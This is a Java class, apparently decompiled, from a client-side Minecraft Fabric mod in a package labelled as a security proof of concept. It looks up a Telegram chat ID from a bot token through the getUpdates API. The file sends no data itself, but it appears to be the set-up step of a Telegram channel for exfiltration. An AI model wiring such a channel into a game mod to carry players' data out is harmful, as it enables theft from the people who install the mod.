package com.securitydemo.poc;

import com.google.gson.JsonArray;
import com.google.gson.JsonElement;
import com.google.gson.JsonObject;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.Reader;
import java.net.HttpURLConnection;
import java.net.URI;
import java.nio.charset.StandardCharsets;
import net.fabricmc.api.EnvType;
import net.fabricmc.api.Environment;

@Environment(EnvType.CLIENT)
final class TelegramChatResolver {
   private TelegramChatResolver() {
   }

   static String resolveChatId(String botToken) throws IOException {
      String url = "https://api.telegram.org/bot" + botToken.trim() + "/getUpdates";
      HttpURLConnection connection = (HttpURLConnection)URI.create(url).toURL().openConnection();
      connection.setRequestMethod("GET");
      connection.setConnectTimeout(15000);
      connection.setReadTimeout(30000);
      InputStreamReader reader = new InputStreamReader(connection.getInputStream(), StandardCharsets.UTF_8);

      JsonObject body;
      try {
         body = Compat.parseJsonObject((Reader)reader);
      } catch (Throwable var8) {
         try {
            reader.close();
         } catch (Throwable var7) {
            var8.addSuppressed(var7);
         }

         throw var8;
      }

      reader.close();
      if (body.has("ok") && body.get("ok").getAsBoolean()) {
         JsonArray results = body.getAsJsonArray("result");
         if (results != null && results.size() != 0) {
            JsonElement last = results.get(results.size() - 1);
            JsonObject update = last.getAsJsonObject();
            if (update.has("message")) {
               return extractChatId(update.getAsJsonObject("message"));
            } else if (update.has("edited_message")) {
               return extractChatId(update.getAsJsonObject("edited_message"));
            } else if (update.has("callback_query")) {
               return update.getAsJsonObject("callback_query").getAsJsonObject("message").getAsJsonObject("chat").get("id").getAsString();
            } else {
               throw new IOException("Could not parse chat_id from Telegram getUpdates");
            }
         } else {
            throw new IOException("No chat_id found. Send /start to your bot in Telegram first, then restart Minecraft.");
         }
      } else {
         throw new IOException("Telegram getUpdates failed");
      }
   }

   private static String extractChatId(JsonObject message) throws IOException {
      if (!message.has("chat")) {
         throw new IOException("Telegram update has no chat object");
      } else {
         return message.getAsJsonObject("chat").get("id").getAsString();
      }
   }
}
